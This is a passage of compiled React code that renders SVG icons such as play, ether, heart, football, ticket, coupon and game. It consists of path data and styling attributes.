        d: "M21.2048 8.65983L23.1842 7.51698C23.4574 7.35926 23.5511 7.00955 23.3934 6.73641C23.2357 6.46327 22.8859 6.36955 22.6128 6.52727L20.6334 7.67012C20.3602 7.82783 20.2665 8.17754 20.4242 8.45069C20.582 8.72383 20.9317 8.81754 21.2048 8.65983Z",
        fill: "#F64900",
        fillOpacity: "0.62"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M23.2592 7.64688L23.2592 7.64688L21.2798 8.78973L21.2798 8.78973L21.2048 8.65983L23.2592 7.64688ZM23.2592 7.64688C23.6041 7.44774 23.7224 7.0063 23.5233 6.6614M23.2592 7.64688L23.5233 6.6614M23.5233 6.6614C23.3241 6.31653 22.8827 6.19822 22.5378 6.39736M23.5233 6.6614L22.5378 6.39736M22.5378 6.39736C22.5378 6.39736 22.5378 6.39737 22.5378 6.39737L22.5378 6.39736Z",
        stroke: "#F64900",
        strokeOpacity: "0.62",
        strokeWidth: "0.3"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M22.1456 13.3079H24.4313C24.7468 13.3079 25.0028 13.0519 25.0028 12.7365C25.0028 12.421 24.7468 12.165 24.4313 12.165H22.1456C21.8302 12.165 21.5742 12.421 21.5742 12.7365C21.5742 13.0519 21.8302 13.3079 22.1456 13.3079Z",
        fill: "#F64900",
        fillOpacity: "0.62"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M22.1456 13.4579H24.4313C24.8296 13.4579 25.1528 13.1347 25.1528 12.7365C25.1528 12.3382 24.8296 12.015 24.4313 12.015H22.1456C21.7474 12.015 21.4242 12.3382 21.4242 12.7365C21.4242 13.1347 21.7474 13.4579 22.1456 13.4579Z",
        stroke: "#F64900",
        strokeOpacity: "0.62",
        strokeWidth: "0.3"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M18.0663 5.10415L19.2091 3.12473C19.3669 2.85159 19.2731 2.50187 19 2.34416C18.7269 2.18645 18.3771 2.28016 18.2194 2.5533L17.0766 4.53272C16.9189 4.80586 17.0126 5.15558 17.2857 5.31329C17.5589 5.471 17.9086 5.37729 18.0663 5.10415Z",
        fill: "#F64900",
        fillOpacity: "0.42"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M19.339 3.19973C19.5382 2.85484 19.4199 2.41339 19.075 2.21426C18.7301 2.01512 18.2887 2.13342 18.0895 2.4783L18.0895 2.4783L16.9467 4.45772C16.9467 4.45772 16.9467 4.45772 16.9467 4.45772C16.7475 4.80261 16.8658 5.24406 17.2107 5.44319C17.5556 5.64233 17.9971 5.52403 18.1962 5.17915L18.1962 5.17915L19.339 3.19973ZM19.339 3.19973L19.2091 3.12473M19.339 3.19973L19.339 3.19973L19.2091 3.12473M19.2091 3.12473L18.0663 5.10415L17.0766 4.53272L18.2194 2.5533C18.3771 2.28016 18.7269 2.18645 19 2.34416C19.2731 2.50187 19.3669 2.85159 19.2091 3.12473Z",
        stroke: "#F64900",
        strokeOpacity: "0.42",
        strokeWidth: "0.3"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M8.92399 4.53272L7.78114 2.5533C7.62342 2.28016 7.27371 2.18645 7.00057 2.34416C6.72743 2.50187 6.63371 2.85159 6.79143 3.12473L7.93428 5.10415C8.09199 5.37729 8.44171 5.471 8.71485 5.31329C8.98799 5.15558 9.0817 4.80586 8.92399 4.53272Z",
        fill: "#F64900",
        fillOpacity: "0.32"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M7.91104 2.4783L7.91104 2.4783L9.05389 4.45772L9.05389 4.45772L7.91104 2.4783ZM7.91104 2.4783C7.71191 2.13342 7.27046 2.01512 6.92556 2.21426M7.91104 2.4783L6.92556 2.21426M6.92556 2.21426C6.58069 2.41339 6.46238 2.85484 6.66152 3.19973M6.92556 2.21426L6.66152 3.19973M6.66152 3.19973C6.66152 3.19973 6.66153 3.19973 6.66153 3.19973L6.66152 3.19973Z",
        stroke: "#F64900",
        strokeOpacity: "0.32",
        strokeWidth: "0.3"
      }));
    case "play":
      return /*#__PURE__*/React__default.createElement("svg", _extends$3({
        width: "23",
        height: "25",
        viewBox: "0 0 23 25",
        fill: "none",
        xmlns: "http://www.w3.org/2000/svg"
      }, props), alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "play"), /*#__PURE__*/React__default.createElement("path", {
        d: "M21.2104 9.5104L5.6839 0.750645C5.17684 0.460874 4.60208 0.310575 4.01808 0.315038C3.43408 0.319501 2.86168 0.478566 2.35911 0.776052C1.86948 1.05608 1.4627 1.46072 1.18008 1.94886C0.897461 2.437 0.749078 2.99124 0.750004 3.55529V21.0748C0.749078 21.6389 0.897461 22.1931 1.18008 22.6812C1.4627 23.1694 1.86948 23.574 2.35911 23.8541C2.86173 24.1514 3.43411 24.3104 4.01808 24.3148C4.60205 24.3193 5.17679 24.1691 5.6839 23.8795L21.2104 15.1197C21.7111 14.8423 22.1285 14.4359 22.4191 13.9427C22.7097 13.4495 22.863 12.8875 22.863 12.3151C22.863 11.7426 22.7097 11.1806 22.4191 10.6874C22.1285 10.1942 21.7111 9.7878 21.2104 9.5104Z",
        fill: "black"
      }));
    case "ether":
      return /*#__PURE__*/React__default.createElement("svg", _extends$3({
        width: "15",
        height: "21",
        viewBox: "0 0 15 21",
        fill: "#070707",
        xmlns: "http://www.w3.org/2000/svg"
      }, props), alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "ether"), /*#__PURE__*/React__default.createElement("path", {
        d: "M7.19338 13.7306V0.225098L0.724121 11.3344L7.19338 13.7306Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M8.36572 14.9813V20.2252L14.9232 12.5524L8.36572 14.9813Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M8.36572 0.225098V13.7306L14.835 11.3344L8.36572 0.225098Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M7.19353 14.9813L0.63623 12.5524L7.19353 20.2252V14.9813Z"
      }));
    case "heart":
      return /*#__PURE__*/React__default.createElement("svg", _extends$3({
        width: "16",
        height: "13",
        viewBox: "0 0 16 13",
        fill: "#D7443E",
        xmlns: "http://www.w3.org/2000/svg"
      }, props), alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "heart"), /*#__PURE__*/React__default.createElement("path", {
        d: "M11.8062 0.392579C14.055 0.403528 15.8753 2.2238 15.8862 4.47259C15.8862 8.59258 8.38625 12.6726 8.38625 12.6726C8.38625 12.6726 0.88623 8.53259 0.88623 4.47259C0.88623 2.21928 2.7129 0.392579 4.96624 0.392579C6.34559 0.381822 7.63513 1.07559 8.38625 2.23257C9.1425 1.08122 10.4287 0.389249 11.8062 0.392579Z"
      }));
    case "category-all":
      return /*#__PURE__*/React__default.createElement("svg", _extends$3({
        width: "21",
        height: "20",
        viewBox: "0 0 21 20",
        fill: "#797C80",
        xmlns: "http://www.w3.org/2000/svg"
      }, props), alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "category-all"), /*#__PURE__*/React__default.createElement("path", {
        d: "M8.34451 10H2.09451C1.29037 10 0.63623 10.6541 0.63623 11.4583V15.2083C0.63623 16.0126 1.29037 16.6667 2.09451 16.6667H8.34451C9.1488 16.6667 9.80295 16.0126 9.80295 15.2083V11.4583C9.80295 10.6541 9.1488 10 8.34451 10Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M8.34451 8.33325H2.09451C1.29037 8.33325 0.63623 8.9874 0.63623 9.79169V18.5417C0.63623 19.3458 1.29037 20 2.09451 20H8.34451C9.1488 20 9.80295 19.3458 9.80295 18.5417V9.79169C9.80295 8.9874 9.1488 8.33325 8.34451 8.33325Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M19.1782 13.3333H12.9282C12.1239 13.3333 11.4697 13.9874 11.4697 14.7917V18.5417C11.4697 19.3458 12.1239 20 12.9282 20H19.1782C19.9823 20 20.6364 19.3458 20.6364 18.5417V14.7917C20.6364 13.9874 19.9823 13.3333 19.1782 13.3333Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M19.1782 0H12.9282C12.1239 0 11.4697 0.654144 11.4697 1.45828V10.2083C11.4697 11.0126 12.1239 11.6667 12.9282 11.6667H19.1782C19.9823 11.6667 20.6364 11.0126 20.6364 10.2083V1.45828C20.6364 0.654144 19.9823 0 19.1782 0V0Z"
      }));
    case "football":
      return /*#__PURE__*/React__default.createElement("svg", _extends$3({
        width: "21",
        height: "20",
        viewBox: "0 0 21 20",
        fill: "#797C80",
        xmlns: "http://www.w3.org/2000/svg"
      }, props), alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "football"), /*#__PURE__*/React__default.createElement("path", {
        d: "M6.87362 0.731795C5.63305 1.23477 4.51988 1.9743 3.56534 2.92856C2.61053 3.8831 1.87183 4.99655 1.36858 6.23684C0.882741 7.43512 0.63623 8.7014 0.63623 10.0003C0.63623 11.2989 0.882741 12.5652 1.36858 13.7629C1.87183 15.0035 2.61081 16.1169 3.56534 17.0712C4.51988 18.026 5.63278 18.765 6.87362 19.2679C8.07191 19.7543 9.3379 20 10.6368 20C11.9357 20 13.2014 19.7535 14.3997 19.2679C15.64 18.765 16.7537 18.026 17.7079 17.0712C18.6628 16.1169 19.4017 15.004 19.9047 13.7629C20.3905 12.5652 20.6365 11.2989 20.6365 10.0003C20.6365 8.7014 20.3903 7.43512 19.9047 6.23684C19.4017 4.99655 18.6622 3.88282 17.7079 2.92856C16.7537 1.9743 15.6411 1.23477 14.3997 0.731795C13.2014 0.246235 11.9357 0 10.6368 0C9.3379 0 8.07191 0.246235 6.87362 0.731795ZM3.13561 14.21C2.65392 13.9077 2.21009 13.5595 1.81711 13.1494C1.21686 11.4603 1.11516 9.63161 1.51284 7.89581C1.69993 7.52688 1.91273 7.17259 2.15343 6.83322C2.22777 6.72848 2.29659 6.61932 2.37618 6.51762L4.63291 7.85298C4.63291 7.87066 4.63291 7.89001 4.63291 7.90963C4.62711 9.12339 4.75037 10.3283 4.99577 11.5158C4.9966 11.5213 4.99743 11.5244 4.99854 11.5294L3.24836 14.2736C3.21022 14.2542 3.17236 14.2332 3.13561 14.21ZM9.84557 18.8492C10.235 19.0479 10.6354 19.2157 11.0469 19.3522C9.29894 19.4282 7.53356 19.0187 5.97297 18.1233L9.75603 18.7973C9.78505 18.8158 9.81462 18.8335 9.84557 18.8492ZM9.83175 18.1664L5.36747 17.3707C4.84516 16.7365 4.37535 16.0655 3.97159 15.3483C3.86879 15.166 3.7541 14.9888 3.66704 14.7984L5.41556 12.0569C5.45425 12.0666 5.49736 12.0768 5.54628 12.0898C6.6401 12.3825 7.75327 12.5906 8.87417 12.7536C8.93967 12.7627 8.99439 12.7708 9.04109 12.7757L11.137 16.3996C10.7733 16.9109 10.4055 17.4194 10.0296 17.9223C9.96717 18.0061 9.90084 18.0865 9.83175 18.1664ZM17.2591 16.6226C16.9037 16.9783 16.5265 17.2989 16.1316 17.5846C16.0661 17.0612 15.9531 16.5483 15.7936 16.0473L18.0299 11.8754C18.6459 11.5949 19.2401 11.2768 19.7917 10.8824C19.8638 10.8313 19.9238 10.7741 19.9702 10.7116C19.8083 12.8675 18.9046 14.9775 17.2591 16.6226ZM17.1599 11.2121C17.2431 11.3707 17.3252 11.531 17.4075 11.6935L15.2475 15.7228C15.2351 15.7256 15.2232 15.7283 15.2108 15.73C14.0432 15.948 12.8662 16.0641 11.6792 16.0696L9.52361 12.3424C9.85911 11.7195 10.1916 11.0941 10.5213 10.4684C10.7451 10.0439 10.9651 9.61669 11.1848 9.18972L15.646 8.73152C16.1924 9.53296 16.71 10.3515 17.1599 11.2121ZM16.2549 6.43278C16.0432 6.99185 15.8166 7.54511 15.5913 8.09949L11.2453 8.54581C11.1934 8.47727 11.1395 8.40984 11.0828 8.34545C10.5696 7.76427 10.0531 7.18668 9.53743 6.60743C9.54213 6.60163 9.54683 6.59721 9.55153 6.59196C9.34343 6.38414 9.13478 6.17632 8.92668 5.96794L10.1366 2.32527C10.22 2.30316 10.304 2.28465 10.3889 2.27553C11.0466 2.20865 11.7052 2.13293 12.3646 2.09479C12.7683 2.07213 13.1743 2.05914 13.585 2.08816L16.5785 5.46221C16.4754 5.78776 16.3748 6.11414 16.2549 6.43278ZM17.2591 3.37737C18.0849 4.20368 18.7244 5.14661 19.1765 6.15393C18.6172 5.76896 18.0191 5.45226 17.3904 5.19414C17.2926 5.15379 17.1923 5.11814 17.0903 5.08305L14.1438 1.76206C14.1642 1.61863 14.175 1.47492 14.1794 1.33011C15.3003 1.78638 16.351 2.46953 17.2591 3.37737ZM7.63747 1.15573C7.64908 1.16429 7.65461 1.17148 7.66124 1.17341C8.33472 1.40611 8.94741 1.74879 9.525 2.15531L8.39469 5.55921C8.38889 5.56087 8.38336 5.56253 8.37784 5.56501C8.14652 5.66063 7.91079 5.7463 7.68307 5.84994C6.74484 6.27636 5.83009 6.74865 4.96841 7.31491L2.73793 5.9953C2.74125 5.92566 2.75313 5.85491 2.7769 5.7919C2.92668 5.39284 3.07398 4.99157 3.24339 4.60052C3.37383 4.29929 3.52251 4.00829 3.68473 3.72392C3.79085 3.60674 3.90084 3.49067 4.01415 3.37737C5.07343 2.31836 6.32533 1.56639 7.6582 1.12174C7.65129 1.13251 7.64411 1.14384 7.63747 1.15573Z"
      }));
    case "info":
      return /*#__PURE__*/React__default.createElement("svg", _extends$3({
        fill: "#000000",
        xmlns: "http://www.w3.org/2000/svg",
        viewBox: "0 0 24 24",
        width: "24px",
        height: "24px"
      }, props), "    ", /*#__PURE__*/React__default.createElement("path", {
        d: "M 12 2 C 6.4889971 2 2 6.4889971 2 12 C 2 17.511003 6.4889971 22 12 22 C 17.511003 22 22 17.511003 22 12 C 22 6.4889971 17.511003 2 12 2 z M 12 4 C 16.430123 4 20 7.5698774 20 12 C 20 16.430123 16.430123 20 12 20 C 7.5698774 20 4 16.430123 4 12 C 4 7.5698774 7.5698774 4 12 4 z M 11 7 L 11 9 L 13 9 L 13 7 L 11 7 z M 11 11 L 11 17 L 13 17 L 13 11 L 11 11 z"
      }));
    case "ticket":
      return /*#__PURE__*/React__default.createElement("svg", _extends$3({
        width: "21",
        height: "20",
        viewBox: "0 0 24 20",
        fill: "#797C80",
        xmlns: "http://www.w3.org/2000/svg"
      }, props), alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "ticket"), /*#__PURE__*/React__default.createElement("path", {
        d: "M16.5435 6.80745L17.0866 6.26465L17.6294 6.80783L17.0863 7.35063L16.5435 6.80745Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M15.457 5.72109L16.0002 5.1781L16.5432 5.72109L16.0002 6.26408L15.457 5.72109Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M14.3711 4.63552L14.9143 4.09253L15.4573 4.63552L14.9143 5.17851L14.3711 4.63552Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M18.7158 8.97951L19.259 8.43652L19.802 8.97951L19.259 9.5225L18.7158 8.97951Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M17.6294 7.8934L18.1724 7.35022L18.7156 7.89321L18.1726 8.43639L17.6294 7.8934Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M13.0838 14.0373C12.9394 14.0371 12.8074 13.9561 12.742 13.8277L12.0484 12.4676L10.541 12.7059C10.3758 12.7333 10.2117 12.6504 10.136 12.5012C10.06 12.3517 10.0897 12.1706 10.2091 12.0532L11.2885 10.9738L10.5974 9.61371C10.5218 9.4654 10.5503 9.2854 10.6681 9.16784C10.7856 9.05009 10.9656 9.02159 11.1138 9.09716L12.4744 9.78846L13.5537 8.70866C13.671 8.58904 13.8523 8.55942 14.0016 8.63535C14.151 8.71129 14.2339 8.87516 14.2065 9.04034L13.9624 10.5518L15.3229 11.2453C15.4708 11.3211 15.5533 11.4834 15.5271 11.6477C15.5008 11.8119 15.3718 11.9405 15.2076 11.9664L13.6997 12.2053L13.4631 13.7131C13.437 13.8774 13.3082 14.0062 13.144 14.0323C13.1241 14.0356 13.1039 14.0373 13.0838 14.0373ZM12.2642 11.6591C12.4086 11.6591 12.5408 11.7403 12.6064 11.8689L12.8894 12.4245L12.987 11.81C13.0131 11.6458 13.1421 11.517 13.3065 11.4909L13.9208 11.3931L13.3652 11.1101C13.2169 11.0346 13.1342 10.8724 13.1601 10.7081L13.2576 10.0918L12.8181 10.5326C12.7004 10.65 12.5204 10.6785 12.3722 10.6028L11.8161 10.3198L12.0996 10.8756C12.175 11.0237 12.1465 11.2037 12.0289 11.3212L11.5878 11.7628L12.2041 11.6653C12.2239 11.6615 12.244 11.6595 12.2642 11.6591Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M23.5564 5.76796L21.6556 3.86712L21.3841 4.13862C21.0938 4.43355 20.6678 4.55017 20.2677 4.44424C19.8678 4.33811 19.5554 4.02574 19.4495 3.62563C19.3435 3.22569 19.4602 2.79951 19.7553 2.50946L20.0268 2.23796L18.1259 0.337494C17.6761 -0.112498 16.9466 -0.112498 16.4966 0.337494L15.1393 1.69497L14.3248 0.880485C13.8748 0.430493 13.1455 0.430493 12.6955 0.880485L0.973725 12.6022C0.523732 13.0522 0.523732 13.7818 0.973725 14.2316L2.87457 16.1324L3.14587 15.8609C3.60187 15.4255 4.31942 15.4255 4.77522 15.8609C5.22521 16.3107 5.22521 17.0403 4.77522 17.4901L4.50373 17.7616L6.40457 19.6628C6.85437 20.1124 7.58355 20.1124 8.03335 19.6628L9.39083 18.3049L10.2057 19.1194C10.6555 19.5692 11.3847 19.5692 11.8347 19.1194L23.5564 7.39693C24.0064 6.94694 24.0064 6.21739 23.5564 5.76759V5.76796ZM7.48999 19.119C7.41799 19.1912 7.3203 19.2317 7.21849 19.2317C7.11649 19.2317 7.01881 19.1912 6.94681 19.119L5.56252 17.734C6.06726 16.9726 5.96583 15.961 5.3199 15.3151C4.67379 14.6692 3.66224 14.5679 2.901 15.0729L1.51634 13.6886C1.36634 13.5386 1.36634 13.2956 1.51634 13.1456L13.2385 1.42348C13.3104 1.35129 13.4081 1.31079 13.5101 1.31079C13.6121 1.31079 13.7098 1.35129 13.7818 1.42348L14.5963 2.23796L4.77485 12.0598C4.32523 12.5096 4.32523 13.2388 4.77485 13.6886L6.67531 15.5894L6.94681 15.3179C7.39661 14.8679 8.12616 14.8679 8.57597 15.3179C9.02596 15.7677 9.02596 16.4973 8.57597 16.9471L8.3041 17.2186L8.84746 17.7616L7.48999 19.119ZM23.0134 6.85432L11.2913 18.5761C11.1413 18.7261 10.8981 18.7261 10.7483 18.5761L9.36364 17.1914C9.86688 16.43 9.76451 15.4195 9.11896 14.7746C8.47322 14.1309 7.4643 14.0291 6.70288 14.5306L5.31784 13.1456C5.16784 12.9958 5.16784 12.7526 5.31784 12.6026L17.0396 0.880485C17.1116 0.808486 17.2094 0.767799 17.3113 0.767799C17.4133 0.767799 17.5109 0.808486 17.5829 0.880485L18.9676 2.2629C18.4634 3.02414 18.565 4.03493 19.2106 4.68067C19.8561 5.32622 20.8671 5.42803 21.6284 4.92404L23.0138 6.30945C23.1636 6.45926 23.1636 6.70245 23.0138 6.85244L23.0134 6.85432Z"
      }));
    case "coupon":
      return /*#__PURE__*/React__default.createElement("svg", _extends$3({
        width: "23",
        height: "23",
        viewBox: "0 0 23 23",
        fill: "#797C80",
        xmlns: "http://www.w3.org/2000/svg"
      }, props), alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "coupon"), /*#__PURE__*/React__default.createElement("path", {
        d: "M10.0642 14.1421L9.59277 14.6135L10.0642 15.0849L10.5356 14.6135L10.0642 14.1421Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M11.007 15.085L10.5356 15.5564L11.007 16.0278L11.4785 15.5564L11.007 15.085Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M11.9494 16.0275L11.478 16.4989L11.9494 16.9703L12.4208 16.4989L11.9494 16.0275Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M9.12131 13.1994L8.6499 13.6708L9.12131 14.1422L9.59271 13.6708L9.12131 13.1994Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M8.17844 12.2566L7.70703 12.728L8.17844 13.1994L8.64984 12.728L8.17844 12.2566Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M7.23556 11.3138L6.76416 11.7852L7.23556 12.2566L7.70697 11.7852L7.23556 11.3138Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M6.29269 10.3709L5.82129 10.8423L6.29269 11.3137L6.7641 10.8423L6.29269 10.3709Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M2.99338 13.6707L2.52197 14.1421L2.99338 14.6135L3.46478 14.1421L2.99338 13.6707Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M14.7785 1.88565L14.3071 2.35706L14.7785 2.82846L15.2499 2.35706L14.7785 1.88565Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M20.4353 7.54227L19.9639 8.01367L20.4353 8.48508L20.9067 8.01367L20.4353 7.54227Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M8.64963 19.3274L8.17822 19.7988L8.64963 20.2702L9.12103 19.7988L8.64963 19.3274Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M17.3711 3.06408C17.5013 2.93392 17.5013 2.72284 17.3711 2.59268L15.0141 0.235656C14.8839 0.105489 14.6728 0.105489 14.5427 0.235655L0.871933 13.9064C0.741766 14.0366 0.741766 14.2476 0.871933 14.3778L3.22896 16.7348C3.35912 16.865 3.57019 16.865 3.70036 16.7348C4.35122 16.084 5.40652 16.084 6.05738 16.7348C6.70825 17.3857 6.70825 18.441 6.05738 19.0918C5.92722 19.222 5.92722 19.4331 6.05738 19.5632L8.41441 21.9203C8.54457 22.0504 8.75564 22.0504 8.88581 21.9203L22.5565 8.24953C22.6867 8.11937 22.6867 7.9083 22.5565 7.77813L20.1995 5.42111C20.0694 5.29094 19.8583 5.29094 19.7281 5.4211C19.0773 6.07197 18.022 6.07197 17.3711 5.42111C16.7202 4.77024 16.7202 3.71495 17.3711 3.06408ZM17.1495 6.11148C17.9787 6.73249 19.118 6.73246 19.9471 6.11148L21.8494 8.01383L8.65011 21.2132L6.74776 19.3108C7.52027 18.2794 7.31041 16.817 6.27894 16.0444C5.44983 15.4235 4.31053 15.4234 3.48139 16.0444L1.57904 14.1421L14.7784 0.942762L16.6807 2.84511C15.9082 3.87655 16.1181 5.33893 17.1495 6.11148Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M9.35736 8.72077C8.83666 9.24146 8.83666 10.0857 9.35736 10.6064C9.87806 11.1271 10.7223 11.1271 11.243 10.6064C11.7637 10.0857 11.7637 9.24146 11.243 8.72077C10.7223 8.20007 9.87806 8.20007 9.35736 8.72077ZM10.7716 10.135C10.5112 10.3953 10.0891 10.3953 9.82876 10.135C9.5684 9.87462 9.5684 9.45253 9.82876 9.19217C10.0891 8.93181 10.5112 8.93181 10.7716 9.19217C11.0319 9.45253 11.0319 9.87462 10.7716 10.135Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M15.0141 8.72089C14.4934 9.24158 14.4934 10.0858 15.0141 10.6065C15.5348 11.1272 16.379 11.1272 16.8997 10.6065C17.4204 10.0858 17.4204 9.24158 16.8997 8.72089C16.379 8.20019 15.5348 8.20019 15.0141 8.72089ZM16.4283 10.1351C16.1679 10.3955 15.7459 10.3955 15.4855 10.1351C15.2251 9.87474 15.2251 9.45265 15.4855 9.19229C15.7459 8.93193 16.1679 8.93193 16.4283 9.19229C16.6887 9.45265 16.6887 9.87474 16.4283 10.1351Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M12.7944 5.89202L12.7944 13.4343L13.4611 13.4343L13.4611 5.89202L12.7944 5.89202Z"
      }));
    case "game":
      return /*#__PURE__*/React__default.createElement("svg", _extends$3({
        width: "27",
        height: "20",
        viewBox: "0 0 27 20",
        fill: "#797C80",
        xmlns: "http://www.w3.org/2000/svg"
      }, props), alt && /*#__PURE__*/React__default.createElement("title", null, alt !== null && alt !== void 0 ? alt : "game"), /*#__PURE__*/React__default.createElement("path", {
        d: "M1.52846 17.8429C2.27304 18.9238 3.41453 19.6667 4.70433 19.9098C5.01654 19.9696 5.33371 19.9999 5.6516 20C6.63696 19.9996 7.59998 19.7065 8.41846 19.1579L9.27772 18.5851C10.3595 17.8625 11.6314 17.4775 12.9322 17.4788H13.7816C15.0824 17.4776 16.3544 17.8627 17.4361 18.5853L18.2954 19.1579C19.1536 19.7301 20.1677 20.023 21.1989 19.9967C22.2301 19.9703 23.2279 19.626 24.0558 19.0107C24.8837 18.3955 25.5013 17.5394 25.8239 16.5596C26.1466 15.5799 26.1586 14.5244 25.8583 13.5376L25.1058 11.0652C24.6235 9.48051 23.6447 8.09275 22.3138 7.1066C20.9828 6.12045 19.3702 5.58813 17.7137 5.58813H9.0001C7.34362 5.58813 5.73099 6.12045 4.40004 7.1066C3.06909 8.09275 2.09028 9.48051 1.60798 11.0652L0.855787 13.5376C0.634026 14.2592 0.579346 15.0219 0.695888 15.7678C0.812429 16.5137 1.09714 17.2233 1.52846 17.8429ZM15.4802 6.43747C15.7055 6.43747 15.9215 6.52695 16.0808 6.68623C16.2401 6.84551 16.3296 7.06154 16.3296 7.2868C16.3296 7.51206 16.2401 7.72809 16.0808 7.88737C15.9215 8.04665 15.7055 8.13613 15.4802 8.13613H11.2336C11.0083 8.13613 10.7923 8.04665 10.633 7.88737C10.4737 7.72809 10.3842 7.51206 10.3842 7.2868C10.3842 7.06154 10.4737 6.84551 10.633 6.68623C10.7923 6.52695 11.0083 6.43747 11.2336 6.43747H15.4802ZM1.66796 13.7849L2.42042 11.3125C2.84971 9.90197 3.72093 8.66676 4.90558 7.78901C6.09023 6.91127 7.5256 6.43746 8.99999 6.43747H9.76333C9.61387 6.69556 9.53505 6.98849 9.53482 7.28674C9.53458 7.58498 9.61294 7.87803 9.76199 8.13636C9.91104 8.3947 10.1255 8.60919 10.3839 8.75826C10.6422 8.90732 10.9352 8.98569 11.2335 8.98547H15.4801C15.7784 8.98569 16.0714 8.90732 16.3298 8.75826C16.5881 8.60919 16.8026 8.3947 16.9516 8.13636C17.1007 7.87803 17.179 7.58498 17.1788 7.28674C17.1786 6.98849 17.0997 6.69556 16.9503 6.43747H17.7136C19.188 6.43746 20.6234 6.91127 21.808 7.78901C22.9927 8.66676 23.8639 9.90197 24.2932 11.3125L25.0459 13.7849C25.2952 14.6042 25.2853 15.4806 25.0174 16.2941C24.7495 17.1075 24.2368 17.8183 23.5494 18.3292C22.862 18.8401 22.0335 19.126 21.1773 19.1479C20.3212 19.1698 19.4792 18.9265 18.7666 18.4514L17.9072 17.8786C16.6861 17.0628 15.2501 16.6281 13.7816 16.6295H12.9322C11.4637 16.6281 10.0278 17.0628 8.80661 17.8786L7.94735 18.4514C7.23475 18.9265 6.39274 19.1698 5.53657 19.1479C4.68039 19.126 3.85189 18.8401 3.16447 18.3293C2.47706 17.8184 1.96431 17.1076 1.69642 16.2941C1.42853 15.4806 1.41859 14.6042 1.66796 13.7849Z"
      }), /*#__PURE__*/React__default.createElement("path", {
        d: "M7.41149 15.7801C8.08342 15.7801 8.74026 15.5809 9.29895 15.2076C9.85764 14.8343 10.2931 14.3037 10.5502 13.6829C10.8074 13.0621 10.8746 12.379 10.7435 11.72C10.6125 11.061 10.2889 10.4557 9.81377 9.98053C9.33864 9.5054 8.7333 9.18184 8.07428 9.05075C7.41526 8.91967 6.73217 8.98695 6.11139 9.24408C5.49061 9.50122 4.96002 9.93666 4.58671 10.4954C4.21341 11.054 4.01416 11.7109 4.01416 12.3828C4.01517 13.2835 4.37343 14.1471 5.01033 14.784C5.64724 15.4209 6.51078 15.7791 7.41149 15.7801ZM5.20631 13.6568H6.13749V14.588C5.75137 14.3639 5.4304 14.0429 5.20631 13.6568ZM8.68549 14.588V13.6568H9.61668C9.39259 14.0429 9.07162 14.3639 8.68549 14.588ZM9.61668 11.1088H8.68549V10.1776C9.07163 10.4017 9.39261 10.7227 9.61668 11.1088ZM7.83616 9.87085V11.5335C7.83616 11.6461 7.8809 11.7541 7.96054 11.8338C8.04018 11.9134 8.1482 11.9581 8.26083 11.9581H9.92345C9.97151 12.2392 9.97151 12.5264 9.92345 12.8075H8.26083C8.1482 12.8075 8.04018 12.8522 7.96054 12.9319C7.8809 13.0115 7.83616 13.1195 7.83616 13.2321V14.8947C7.55509 14.9428 7.26789 14.9428 6.98683 14.8947V13.2321C6.98683 13.1195 6.94209 13.0115 6.86245 12.9319C6.7828 12.8522 6.67479 12.8075 6.56216 12.8075H4.89954C4.85148 12.5264 4.85148 12.2392 4.89954 11.9581H6.56216C6.67479 11.9581 6.7828 11.9134 6.86245 11.8338C6.94209 11.7541 6.98683 11.6461 6.98683 11.5335V9.87085C7.2679 9.82279 7.55509 9.82279 7.83616 9.87085ZM6.13749 10.1776V11.1088H5.20631C5.43038 10.7227 5.75135 10.4017 6.13749 10.1776Z"
      }), /*#__PURE__*/React__default.createElement("path", {
